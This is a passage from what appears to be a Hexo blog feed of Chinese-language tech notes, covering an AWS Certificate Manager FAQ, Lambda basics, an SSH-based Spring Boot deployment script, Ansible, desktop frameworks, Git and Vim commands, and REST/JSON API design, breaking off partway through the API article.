查看日志，从而了解证书私有密钥的使用时间。</p><h3 id="记账功能"><a href="#记账功能" class="headerlink" title="记账功能"></a>记账功能</h3><p>问：ACM 证书的使用如何收费和计费？</p><p>通过 AWS Certificate Manager 预置、管理和部署的 SSL/TLS 证书可免费使用。您只需针对为运行应用程序而创建的 AWS 资源付费，例如 Elastic Load Balancing 负载均衡器或 Amazon CloudFront 分配。</p><h3 id="详细信息"><a href="#详细信息" class="headerlink" title="详细信息"></a>详细信息</h3><p>问：我是否可以将同一证书用于多个 Elastic Load Balancing 负载均衡器和多个 CloudFront 分配？</p><p>可以。</p><p>问：我是否可以将证书用于没有公共 Internet 访问权限的内部 Elastic Load Balancing 负载均衡器？</p><p>可以。请参阅托管更新与部署，详细了解 ACM 如何处理无法通过公共 Internet 访问的证书的更新问题。</p><p>问：用于 <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 的证书是否也能用于 example.com？</p><p>不可以。如果您希望自己的站点能够被两个域名 (<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 和 example.com) 引用，则必须请求包含这两个名称的证书。</p><p>问：我是否可以导入第三方证书并将其用于 AWS 服务？</p><p>可以。如果想要将第三方证书与 Amazon CloudFront 或 Elastic Load Balancing 配合使用，您可以使用 AWS 管理控制台、AWS CLI 或 AWS Certificate Manager API 将该证书导入 ACM。ACM 不会处理已导入证书的更新流程。您可以使用 AWS 管理控制台监控已导入证书的到期日期，并导入新的第三方证书以便替换即将过期的证书。</p><p>问：ACM 提供的证书的有效期是多久？</p><p>目前，ACM 提供的证书的有效期为 13 个月。</p><p>问：ACM 如何帮助我的企业或组织满足合规性要求？</p><p>使用 ACM 可以轻松确保连接的安全性 (这也是 PCI、 FedRAMP 以及 HIPAA 等众多合规性计划的共同要求)，从而帮助您遵守法规要求。有关合规性的具体信息，请参阅 <a href="http://aws.amazon.com/compliance。" target="_blank" rel="noopener">http://aws.amazon.com/compliance。</a></p><p>问：ACM 是否有服务等级协议 (SLA)？</p><p>目前没有。</p><p>问：ACM 是否允许域名 (也称为国际化域名 (IDN)) 中包含本地语言字符？</p><p>ACM 不支持采用 Unicode 编码的本地语言字符；不过，ACM 支持域名使用 ASCII 编码的本地语言字符。</p><p>问：ACM 支持哪些域名标签格式？</p><p>ACM 仅支持采用 UTF-8 编码的 ASCII 字符，包括包含“xn-”的标签 (通常称为域名的 Punycode)。ACM 不支持域名中使用 Unicode 输入 (Unicode 标签)。</p><p>问：ACM 是否会提供一个可以在我的网站上显示的安全站点签章或信任徽标？</p><p>不会。如果您想使用站点签章，您可以从第三方供应商处获得。我们建议选择可评估和维护您站点和/或业务实践的安全性的供应商。</p><p>问：亚马逊是否允许将其商标或徽标用作证书徽章、站点签章或信任徽标？</p><p>不允许。此类签章和徽章可复制到不使用 ACM 服务的站点，但不能假借亚马逊名号建立信任。为保护我们的客户和亚马逊的声誉，我们不允许以这种方式使用我们的徽标。</p><h3 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h3><p>问：AWS CloudTrail 提供哪些日志记录信息？</p><p>您可以确定哪些用户和账户为支持 AWS CloudTrail 的服务调用了 AWS API、发出调用的源 IP 地址以及调用发生的时间。例如，您可以确定哪些用户为关联 ACM 提供的证书与 Elastic Load Balancer 调用了 API，以及 Elastic Load Balancing 服务使用 KMS API 调用加密密钥的时间。</p><h3 id="托管更新与部署"><a href="#托管更新与部署" class="headerlink" title="托管更新与部署"></a>托管更新与部署</h3><p>问：什么是 ACM 托管更新与部署？</p><p>ACM 托管更新与部署可以管理由 ACM 提供的 SSL/TLS 证书的更新流程并部署更新后的证书。</p><p>问：使用 ACM 托管更新与部署有哪些优势？</p><p>ACM 可帮助您管理 SSL/TLS 证书的更新和部署。与容易出错的手动流程相比，ACM 能够让安全 Web 服务或应用程序的 SSL/TLS 配置和维护具有更高的操作可靠性。托管更新与部署有助于您避免因证书过期导致的停机。ACM 托管更新与部署不需要您在自己的站点安装或维护软件客户端或代理。ACM 会作为一种服务运行，并且与其他 AWS 服务集成。这意味着，您可以使用 AWS 管理控制台、AWS CLI 或 API 在 AWS 平台上集中管理和部署证书。</p><p>问：哪些证书可以自动更新和部署？</p><p>ACM 能够更新并部署 ACM 提供的证书，而无需域的所有者进行任何其他审批或介入。如果证书必须经过附加审批才能更新，ACM 会基于证书中的所有域名向相应域的所有者提出审批请求，以此管理更新流程。在证书中的所有域名均获得批准后，ACM 会更新证书并自动将其部署到您的 AWS 资源。如果域的所有者没有批准证书，我们会通知您 (AWS 账户所有者)。为了提高 ACM 自动更新和部署 ACM 提供的证书的能力，请确保证书正在使用，且证书中包括的所有域名均能解析至您的站点，并可通过 Internet 访问。<br>问：ACM 何时更新证书？</p><p>ACM 最早可在证书过期前 60 天开始执行更新流程。目前，ACM 提供的证书的验证期限是 13 个月。请参阅 ACM 用户指南，了解有关托管续订的更多信息。</p><p>问：在更新证书和部署新证书之前，我是否会收到通知？</p><p>不会。ACM 可能会在不提前通知的情况下更新证书或更新密钥，并更换旧的证书。</p><p>问：ACM 是否可以更新包含裸域 (也称为顶级域名，例如“example.com”) 的证书？</p><p>为了提高 ACM 自动更新和部署包含裸域的证书的能力，请确保裸域的 DNS 查找能够解析至与该证书关联的 AWS 资源。将裸域解析到 AWS 资源可能非常困难，除非您使用 Route 53 或支持别名资源记录 (或同类记录) 的其他 DNS 提供商，从而将裸域映射到 AWS 资源。有关更多信息，请参阅 Route 53 开发人员指南。</p><p>问：在 ACM 部署更新后的证书时，我的站点是否会断开现有连接？</p><p>不会。在部署新证书之后建立的连接将使用新证书，而现有连接不会受到影响。</p>]]></content>
      
      
      <categories>
          
          <category> aws </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Lambda 入门</title>
      <link href="/aws/devops/aws%20lambda/"/>
      <url>/aws/devops/aws%20lambda/</url>
      
        <content type="html"><![CDATA[<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p>Official website:<br><a href="http://docs.aws.amazon.com/zh_cn/lambda/latest/dg/lambda-app.html" target="_blank" rel="noopener">http://docs.aws.amazon.com/zh_cn/lambda/latest/dg/lambda-app.html</a></p><p>A video tutorial:<br><a href="https://www.lynda.com/Amazon-Web-Services-tutorials/Serverless-architectures-AWS-Lambda/569195/617984-4.html?srchtrk=index%3a3%0alinktypeid%3a2%0aq%3alambda+aws%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2" target="_blank" rel="noopener">https://www.lynda.com/Amazon-Web-Services-tutorials/Serverless-architectures-AWS-Lambda/569195/617984-4.html?srchtrk=index%3a3%0alinktypeid%3a2%0aq%3alambda+aws%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2</a></p><h2 id="什么是Lambda？"><a href="#什么是Lambda？" class="headerlink" title="什么是Lambda？"></a>什么是Lambda？</h2><p>AWS Lambda 是一项计算服务，可使您无需预配置或管理服务器即可运行代码。AWS Lambda 只在需要时执行您的代码并自动缩放，从每天几个请求到每秒数千个请求。您只需按消耗的计算时间付费 – 代码未运行时不产生费用。借助 AWS Lambda，您几乎可以为任何类型的应用程序或后端服务运行代码，而且无需执行任何管理。AWS Lambda 在可用性高的计算基础设施上运行您的代码，执行计算资源的所有管理工作，其中包括服务器和操作系统维护、容量预置和自动扩展、代码监控和记录。您只需要以 AWS Lambda 支持的一种语言 (目前为 Node.js、Java、C# 和 Python) 提供您的代码。</p><h2 id="为什么需要学习它？"><a href="#为什么需要学习它？" class="headerlink" title="为什么需要学习它？"></a>为什么需要学习它？</h2><p>Lambda 提供了一种与环境无关的代码执行平台，更加灵活去使用</p><h2 id="这项技术定位"><a href="#这项技术定位" class="headerlink" title="这项技术定位"></a>这项技术定位</h2><p>新技术可以用在私人或者试用项目中，产品环境暂时不推荐使用，类似于BAE等平台</p><h2 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h2><p>实际上Lambda 包含了函数和事件系统。在AWS中可以设定各种不同的事件源来trigger我们的Lambda函数</p><h2 id="构建-Lambda-函数"><a href="#构建-Lambda-函数" class="headerlink" title="构建 Lambda 函数"></a>构建 Lambda 函数</h2><p>Lambda函数可以在本地开发环境中开发，然后上传到AWS平台上运行。目前AWS支持四种编程语言：</p><ul><li>Nodejs</li><li>Java</li><li>Python</li><li>C#</li></ul><p>编写相关的程序需要遵守一些基本程序结构，因此AWS能解析并执行。</p><p>## </p>]]></content>
      
      
      <categories>
          
          <category> aws </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用SSH实现自动化部署</title>
      <link href="/aws/devops/auto%20deployment%20with%20ssh/"/>
      <url>/aws/devops/auto%20deployment%20with%20ssh/</url>
      
        <content type="html"><![CDATA[<h2 id="相关解决方案"><a href="#相关解决方案" class="headerlink" title="相关解决方案"></a>相关解决方案</h2><p>在web项目中有时候，需要部署代码上线，因此有一些问题在于怎么自动化部署。通常的做法是使用CI/CD平台配合自定义的脚本来实现。</p><ul><li>对于PHP可以使用git、SVN直接同步代码，配合Puppet使用</li><li>Java和前端等项目可以使用包管理来发布</li></ul><h2 id="小型SSH部署代码实现"><a href="#小型SSH部署代码实现" class="headerlink" title="小型SSH部署代码实现"></a>小型SSH部署代码实现</h2><p>对于小型团队和自己的项目贴一段用SSH实现的Spring boot部署方案</p><p>SCP jar文件到远程服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">scp -i "./.circleci/aws.pem" whoisspy-0.0.1-SNAPSHOT.jar ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com:/home/ubuntu/workspace/whoisspy-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p>kill原来的端口，然后启动新的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -i "./.circleci/aws.pem" ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com 'ls</span><br><span class="line">            cd workspace</span><br><span class="line">            #kill old instance</span><br><span class="line">            output=$( netstat -apn | grep 8086 | grep LISTEN) &amp;&amp; read num1 num2 num3 num4 num5  &lt;&lt;&lt;$&#123;output//[^0-9]/ &#125; &amp;&amp; kill -9 $num5 || pwd</span><br><span class="line"></span><br><span class="line">            # todo start new instance</span><br><span class="line">            java -jar whoisspy-0.0.1-SNAPSHOT.jar &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">            # test if it has been started</span><br><span class="line">            netstat -apn | grep 8086'</span><br></pre></td></tr></table></figure><p>清理本地SSH链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pid=$( ps aux | grep amazonaws | awk '&#123;print $2&#125;' | sort -n | head -n 1 )</span><br><span class="line">leep 5 &amp;&amp; kill $&#123;pid&#125; &amp;&amp; echo "ssh command is complete"</span><br></pre></td></tr></table></figure><p>关于怎么远程执行命令并合理退出，参考了文章：<a href="http://blog.csdn.net/fdipzone/article/details/23000201" target="_blank" rel="noopener">http://blog.csdn.net/fdipzone/article/details/23000201</a></p>]]></content>
      
      
      <categories>
          
          <category> aws </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Ansible 入门和使用</title>
      <link href="/devops/devops/ansible/"/>
      <url>/devops/devops/ansible/</url>
      
        <content type="html"><![CDATA[<p>官网: <a href="https://www.ansible.com/get-started" target="_blank" rel="noopener">https://www.ansible.com/get-started</a><br>工作原理:<a href="https://www.ansible.com/how-ansible-works" target="_blank" rel="noopener">https://www.ansible.com/how-ansible-works</a><br>下载和安装:<a href="http://docs.ansible.com/ansible/latest/intro_installation.html" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/intro_installation.html</a><br>编写自己的脚本:<a href="http://docs.ansible.com/ansible/latest/playbooks.html" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/playbooks.html</a><br>一些ansible 例子:<a href="https://github.com/ansible/ansible-examples" target="_blank" rel="noopener">https://github.com/ansible/ansible-examples</a></p><p>使用ansible playbook部署LAMP<br><a href="https://github.com/ansible/ansible-examples/tree/master/lamp_simple" target="_blank" rel="noopener">https://github.com/ansible/ansible-examples/tree/master/lamp_simple</a></p><p>我的常用脚本仓库</p><p><a href="https://github.com/linksgo2011/deployment-automation" target="_blank" rel="noopener">https://github.com/linksgo2011/deployment-automation</a></p><h3 id="Check-Mode-“Dry-Run”"><a href="#Check-Mode-“Dry-Run”" class="headerlink" title="Check Mode (“Dry Run”)"></a>Check Mode (“Dry Run”)</h3><p>ansible version 1.1 后提供了一种dryrun环境，使得我们可以测试我们的脚本而不造成任何changes</p><p><a href="http://docs.ansible.com/ansible/latest/playbooks_checkmode.html#id1" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/playbooks_checkmode.html#id1</a></p><p>Example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ansible-playbook foo.yml --check</span><br></pre></td></tr></table></figure><h3 id="Ansible-test"><a href="#Ansible-test" class="headerlink" title="Ansible test"></a>Ansible test</h3><p><a href="http://docs.ansible.com/ansible/latest/dev_guide/testing.html" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/dev_guide/testing.html</a></p>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>桌面应用开发方案</title>
      <link href="/desktop/desktop/Desktopapp%20tech%20stack/"/>
      <url>/desktop/desktop/Desktopapp%20tech%20stack/</url>
      
        <content type="html"><![CDATA[<h3 id="Python-开发方案-快速高效、跨平台，推荐"><a href="#Python-开发方案-快速高效、跨平台，推荐" class="headerlink" title="Python 开发方案 (快速高效、跨平台，推荐)"></a>Python 开发方案 (快速高效、跨平台，推荐)</h3><ul><li>Python </li><li>Wxpython </li><li>Pycharm </li><li>Pyinstaller </li></ul><h3 id="Web混合开发方案"><a href="#Web混合开发方案" class="headerlink" title="Web混合开发方案"></a>Web混合开发方案</h3><ul><li>Electron</li><li>Photonkit</li></ul><p>使用Electron混合开发桌面应用<br>参考文档：<a href="https://github.com/amhoho/electron-cn-docs" target="_blank" rel="noopener">https://github.com/amhoho/electron-cn-docs</a><br>缺点是包过大</p><h3 id="易语言"><a href="#易语言" class="headerlink" title="易语言"></a>易语言</h3><ul><li>易语言</li></ul><p>简单使用，缺点不能跨平台</p><h3 id="Xamarin"><a href="#Xamarin" class="headerlink" title="Xamarin"></a>Xamarin</h3><ul><li>C# </li><li>Xamarin</li></ul><p>能构建IOS/Android/Mac/Window平台</p><h3 id="Monodeveloper"><a href="#Monodeveloper" class="headerlink" title="Monodeveloper"></a>Monodeveloper</h3><ul><li>C#</li><li>Monodeveloper</li></ul><p>参考资料：<a href="http://www.monodevelop.com/" target="_blank" rel="noopener">http://www.monodevelop.com/</a><br>C# 开发简单，能调用系统API，目前.net 能方便跨平台 </p><h3 id="Duilib-技术"><a href="#Duilib-技术" class="headerlink" title="Duilib 技术"></a>Duilib 技术</h3><ul><li>duilib</li><li>C++</li></ul><p>Duilib界面开发效率非常高</p><h3 id="QT"><a href="#QT" class="headerlink" title="QT"></a>QT</h3><ul><li>QT </li><li>Qt Creater</li></ul><p>跨平台，但是C++语言层面难度太大</p>]]></content>
      
      
      <categories>
          
          <category> desktop </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常用的GIT命令</title>
      <link href="/devops/devops/Git%20commands/"/>
      <url>/devops/devops/Git%20commands/</url>
      
        <content type="html"><![CDATA[<p>配置全局邮箱和名字</p><blockquote><p>git config –global user.email “email”</p></blockquote><blockquote><p>git config –global user.name “name”</p></blockquote><p>查看服务器和本地上分支</p><blockquote><p>git branch -a</p></blockquote><p>获取服务器分支并映射到本地</p><blockquote><p>git fetch origin 远程分支名x:本地分支名x</p></blockquote><p>设置pull  push映射</p><blockquote><p>git branch –set-upstream-to=origin/<branch> localBranchName</branch></p></blockquote><p>临时缓存本地更改并清空工作区</p><blockquote><p>git stash </p></blockquote><p>从 stash 中取出</p><blockquote><p>git stash pop</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常用开源项目收集</title>
      <link href="/collection/common%20tools/"/>
      <url>/collection/common%20tools/</url>
      
        <content type="html"><![CDATA[<p><a href="http://veyon.io/#" target="_blank" rel="noopener">http://veyon.io/#</a></p><p>非常不错的开源教学软件</p><p><img src="http://veyon.io/img/veyon-features.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> collection </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>必背的常用VIM命令</title>
      <link href="/collection/common-vim-commands/"/>
      <url>/collection/common-vim-commands/</url>
      
        <content type="html"><![CDATA[<p>通常来讲,我们不需要使用VIM做开发,但是需要掌握基本的VIM命令,因为需要在服务器上使用。<br>网上的VIM命令表太长,整理一个基本的命令表</p><p>【按下Esc后的命令模式执行</p><hr><pre><code>a       插入字母后i       插入当前光标</code></pre><hr><pre><code>dd       删除当前行yy       复制当前行</code></pre><hr><pre><code>         v       选择         d       剪切         y       复制         p       粘贴在当前光标处上面         P       粘贴在当前光标处下面shift+p       在当前行前粘贴</code></pre><hr><pre><code>       u       撤销操作ctrl+r       重复操作</code></pre><hr><pre><code>          ^       移动到本行第一个非空白字符上0(数字0)      移动到本行第一个字符上,          $       移动到行尾        3$       移动到下面3行的行尾   ctrl+f       跳转下一页  ctrl+b       跳转上一页    [[/gg       文件头     ]]/G       文件尾</code></pre><hr><pre><code>:set nu       显示行号    :100       跳转到100位置</code></pre><hr><pre><code>:q!       不保存退出 :w       保存  :x       保存退出</code></pre><hr><pre><code>/xxx       向后查找xxx?xxx       向上查找xxx     n       继续查找下一个</code></pre><h2 id="set-nohlsearch-关闭高亮搜索显示"><a href="#set-nohlsearch-关闭高亮搜索显示" class="headerlink" title="   :set nohlsearch       关闭高亮搜索显示"></a>   :set nohlsearch       关闭高亮搜索显示</h2><p>  :%s/abc/123/gc       将abc替换成123</p>]]></content>
      
      
      <categories>
          
          <category> collection </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>OAuth2 架构设计</title>
      <link href="/architecture/architecture/OAuth2/"/>
      <url>/architecture/architecture/OAuth2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>大型系统的网站架构概览</title>
      <link href="/architecture/architecture/architecture%20overview/"/>
      <url>/architecture/architecture/architecture%20overview/</url>
      
        <content type="html"><![CDATA[<p>技术点</p><ul><li>单点登录</li><li>API gateway</li><li>文件存储系统</li><li>批量任务执行</li><li>日志搜索</li><li>分布式调用</li><li>前端</li><li>移动前端</li><li>移动端</li><li>小程序</li><li>微信公共平台</li><li>支付系统</li><li>部署</li><li>CI/CD</li><li>数据方案<ul><li>读写分离</li><li>大数据</li><li>数据库中间件 </li></ul></li><li>CMS系统</li><li>数据备份和运维</li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>大型系统架构设计</title>
      <link href="/architecture/architecture/large%20websites%20architecture/"/>
      <url>/architecture/architecture/large%20websites%20architecture/</url>
      
        <content type="html"><![CDATA[<h2 id="技术选型清单"><a href="#技术选型清单" class="headerlink" title="技术选型清单"></a>技术选型清单</h2><ul><li>Java</li><li>JWT</li><li>RabbitMQ</li><li>Redis</li><li>Linux </li><li>Ngnix</li><li>Mybatis </li><li>React</li><li>Swagger</li><li>Splunk </li><li>Pack testing </li><li>OAuth2/SSO</li><li>CDN </li><li>Mysql</li><li>zookeeper</li></ul><h2 id="分布式架构设计图"><a href="#分布式架构设计图" class="headerlink" title="分布式架构设计图"></a>分布式架构设计图</h2>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API设计要点</title>
      <link href="/architecture/architecture/Architecture%20for%20API/"/>
      <url>/architecture/architecture/Architecture%20for%20API/</url>
      
        <content type="html"><![CDATA[<h1 id="细说API设计和开发"><a href="#细说API设计和开发" class="headerlink" title="细说API设计和开发"></a>细说API设计和开发</h1><p>Catalog</p><ol><li>重新认识API</li><li>理解Restful</li><li>使用JSON API置顶数据结构<ul><li>标准解读</li><li>payload<ul><li>HATEOAS</li><li>数据类型</li><li>分页</li><li>links</li><li>错误信息<ul><li>生产环境屏蔽信息</li></ul></li></ul></li></ul></li><li><p>文档</p><ul><li>swagger </li><li>apidoc </li><li>parade 中心化API文档管理工具</li></ul></li><li><p>版本策略</p><ul><li>prefix version endpoint </li><li>header parameter </li></ul></li><li><p>认证和授权</p><ul><li>API和WEB的认证异同</li><li>JWT</li><li>OAuth</li><li>终极方案，签名</li></ul></li><li>性能<ul><li>数据节流</li><li>负载均衡<ul><li>AWS ELB </li><li>Ngnix</li></ul></li></ul></li><li><p>安全</p><ul><li>幂等性下的数据一致性 </li><li>stateless CSRF</li><li>重放工具 DDOS</li><li>恶意调用</li></ul></li><li><p>监控和日志</p><ul><li>dynatrace </li><li>splunk</li></ul></li><li><p>API测试</p><ul><li>PostMan</li><li>自动化测试<ul><li>curl</li><li>Python pycurl</li><li>newman+postman</li></ul></li><li>性能测试<ul><li>AB</li></ul></li><li>契约测试 Pact</li></ul></li><li><p>API gateway</p><ul><li>kong</li></ul></li><li><p>教训</p><ul><li>版本管理优先</li><li>认证优先</li></ul></li><li>探索<ul><li>Graphql</li><li>Firebase</li></ul></li></ol><p>如果你是一个客户端、前端开发者，你一定在某个时间吐槽过后端工程师的API设计，原因可能是文档不完善、返回数据丢字段、错误码不清晰等。<br>如果你是一个后端API开发者，你一定在某些时候感到困惑，怎么才能合适的描述我的API，怎么让接口URL设计的合理，数据格式怎么定，错误码怎么处理，API怎么做版本管理等问题。</p><p>在前后端分离和微服务成为现代软件开发的大趋势下，本篇希望和大家聊一些无论你听说或用过与否，你可以从中获取一些能在工作中使用API构建技术</p><p>我敢断言从事过互联网开发的工程师都接触过API，在我早期的工作生涯中，那时的应用是ASP、PHP等后端语言来渲染页面，往往把APIAjax联系起来，使用JavaScript调用后端的某个接口，对其中的Cookie传递、跨域限制等知识毫无意识。通过几年移动端和富前端的发展和变化，API的构建已经变得非常重要和清晰，但仍然有大量的API构建在混杂的后端应用和缺乏一些规范、完善的认证、配套的基础设施，本篇根据我近一两年俩持续工作在构建API的项目上的经验，尝试对API项目相关知识进行梳理。</p><h2 id="重新认识API"><a href="#重新认识API" class="headerlink" title="重新认识API"></a>重新认识API</h2><ul><li><p>广义的API（Application Programming Interface）是指应用程序编程接口，包括在操作系统中的动态链接库文件例如dll\so，或者基于TCP层的socket连接，用来提供预定义的方法和函数，调用者无需访问源码和理解内部原理便可实现相应功能。而当前通常指通过HTTP协议传输的web service技术。</p></li><li><p>API在概念上和语言无关，理论上具有网络操作能力的所有编程语言都可以提供API服务。Java、PHP、Node甚至C++都可以实现web API功能，都是通过响应HTTP请求并构造HTTP包来完成的，但是内部实现原理不同。例如QQ邮箱就是通过使用了C++构建CGI服务器实现的。</p></li><li><p>JSON和XML和API概念上无关，JSON和XML只是一种传输格式，便于计算机解析和读取数据，因此都有一个共同特点就是具有几个基本数据类型，同时提供了嵌套和列表的数据表达方式。JSON因为更加轻量、容易解析、和JavaScript天生集成，因此成为现在主流传输格式。在特殊的场景下可以构造自己的传输格式，例如JSONP传输的实际上是一段JavaScript代码来实现跨域。</p></li><li>基于以上，API设计的目的是为了让程序可读，应当遵从简单、易用、无状态等特性，这也是为什么Restful风格流行的原因。</li></ul><h2 id="Restful风格和JSON-API"><a href="#Restful风格和JSON-API" class="headerlink" title="Restful风格和JSON API"></a>Restful风格和JSON API</h2><p>REST（英文：Representational State Transfer，简称REST），RESTful是一种对基于HTTP的应用设计风格，只是提供了一组设计原则和约束条件，而不是一种标准，只是用来规范你的API设计变得更简洁、清晰和富有层次，对缓存等实现更有帮助。网络上有大量对RESTful风格的解读，简单来说Restful规定了如果定义URI和HTTP状态码。</p><p>Restful第一次被提出是在2000Roy Fielding的博士论文中，他也是HTTP协议标准制定者之一。从本质上理解Restful，它其实是对怎么尽可能复用HTTP特性来规范软件设计，甚至提高传输效率。HTTP包处于网络应用层，因此HTTP包为平台无关的字符串表示，如果尽可能的使用HTTP的包特征而不是大量在body定义自己的规则，可以用更简洁、清晰、高效的方式实现同样的需求。</p><p>{配图}<br>用我5年前一个真实的例子，我们为了提供一个订单信息API，为了更方便传递信息全部使用了POST请求</p><p>path: /base-path/product<br>request:<br>{<br>    “method”:”getProduct”,<br>    “data”:{<br>       “categoryId”:1,<br>       “productId”: 1<br>    }<br>}</p><p>response:<br>{<br>    “status”:”调用状态”<br>    “data”:”数据”<br>    “error”:”产品没找到”<br>    “code”:”错误码”<br>}</p><p>对前端来说，在组装请求的时候显得麻烦不说，另外返回到数据的时候需要检查HTTP的状态是不是200，还需要检查status字段。</p><p>那么使用Restful会变成这样:</p><p>path: /base-path/categories/{categoryId}/products/{productId}<br>Method: GET</p><p>Status:200<br>response:<br>{<br>    data:{</p><pre><code>},error:null</code></pre><p>}</p><p>例子中使用路径参数构建URL和HTTP状态码表示调用结果，我们能来理解Restful怎样充分利用了HTTP协议，Restful可以看做对HTTP协议上的语法（网络协议三要素：语义、语法、时序）进一步规范，因此URL通常为操作的目标实体，Method为操作的动词（GET\POST\PUT\DELETE等）,body为附带的数据。<em>Restful的本质是基于HTTP协议对资源的增删改查操作做出定义</em></p><p>理解HTTP协议非常简单，HTTP是通过网络socket发送一段字符串，这个字符串由键值对组成的header部分和纯文本的body部分组成。Url、Cookie、Method都在header中。</p><p>几个典型的Restful API场景</p><p>|功能|URL|HTTP Method|<br>|获取一组数据列表|/base-path/records|GET|<br>|根据ID获取某个数据|/base-path/records/{recordID}|GET|<br>|新建数据|/base-path/records|POST|<br>|完整的更新数据|/base-path/records/{recordID}|PUT|<br>|部分更新数据|/base-path/records/{recordID}|PATCH|<br>|删除|/base-path/records/{recordID}|删除数据|<br>|跨域访问预请求|/base-path/records/{recordID}|OPTION|</p><p>虽然HTTP协议定义了其他的Method，但是就普通场景来说，用好上面的几项已经足够了</p><p>Restful的几个注意点</p><ul><li>设计风格没有对错之分，Restful一种设计风格，与此对应的还有RPC甚至自定义的风格</li><li>无状态，HTTP设计本来就是没有状态的，之所以看起来有状态因为我们浏览器使用了cookie，每次请求都会把sessionID（可以看做身份标识）传递到headers中。关于Restful风格下怎么做用户身份认证我们会在后面讲到。</li><li>Restful和语言、传输格式无关</li><li>一个典型的误区是在HTTP数据包的body部分自定义HTTP协议已经存在的规则</li></ul><h2 id="Json-API"><a href="#Json-API" class="headerlink" title="Json API"></a>Json API</h2><p>因为Restful风格仅仅规定了URL和HTTP Method的使用，这个时候你一定想问，我们怎么定义请求或者返回对象的结构，以及该如何针对不同的情况返回不同的HTTP 状态码。同样的，这个世界上已经有人注意到这个问题，有一份开源规范文档叫做jsonapi被编写出来尝试解决这个问题，jsonapi最早来源于Ember Data（Ember是一个JavaScript前端框架，在框架中定义了一个通用的数据格式，后来被广泛认可）。</p><p>JSON已经是最主流的网络传输格式，因此本文默认JSON作为传输格式来讨论后面的话题。</p><p>jsonapi尝试去提供一个非常通用的描述数据资源的格式，关于记录的创建、更新和删除，因此要求在前后端均容易实现，并包含了基本的关系类型。个人理解，它的设计非常接近数据库ORM输出的数据类型，和一些Nosql（例如MongoDB）的数据结构也很像，从而对前端开发者来说拥有操作数据库或数据集合的体验。另外一个使用这个规范的好处是，已经有大量的库和框架做了相关实现，例如，backbone-jsonapi ，json-patch。</p><p><code></code></p><h2 id="MIME-类型"><a href="#MIME-类型" class="headerlink" title="MIME 类型"></a>MIME 类型</h2><p>JSON API数据格式已经被IANA机构接受了注册，因此必须使用application/vnd.api+json类型。客户端请求头中Content-Type应该为application/vnd.api+json，并且在Accept中也必须包含application/vnd.api+json。如果指定错误服务器应该返回415或406状态码。</p><h2 id="JSON文档结构"><a href="#JSON文档结构" class="headerlink" title="JSON文档结构"></a>JSON文档结构</h2><p>在顶级节点使用data、errors、meta，来描述数据、错误信息、元信息，注意data和errors应该互斥，不能再一个文档中同时存在。</p><p>{<br>  “links”: {<br>    “self”: “<a href="http://example.com/articles&quot;" target="_blank" rel="noopener">http://example.com/articles&quot;</a>,<br>    “next”: “<a href="http://example.com/articles?page[offset]=2&quot;" target="_blank" rel="noopener">http://example.com/articles?page[offset]=2&quot;</a>,<br>    “last”: “<a href="http://example.com/articles?page[offset]=10&quot;" target="_blank" rel="noopener">http://example.com/articles?page[offset]=10&quot;</a><br>  },<br>  “data”: [{<br>    “type”: “articles”,<br>    “id”: “1”,<br>    “attributes”: {<br>      “title”: “JSON API paints my bikeshed!”<br>    },<br>    “relationships”: {<br>     …<br>    },<br>    “links”: {<br>      “self”: “<a href="http://example.com/articles/1&quot;" target="_blank" rel="noopener">http://example.com/articles/1&quot;</a><br>    }<br>  }],<br>  “included”: [],<br>  “meta”: {<br>    “version”: “1.0”,<br>    “copyright”: “Copyright 2015 Example Corp.”,<br>  }<br>}</p><p><code></code></p><h3 id="data属性"><a href="#data属性" class="headerlink" title="data属性"></a>data属性</h3><p>一个典型的data的对象格式</p><p>`{<br>     “type”: 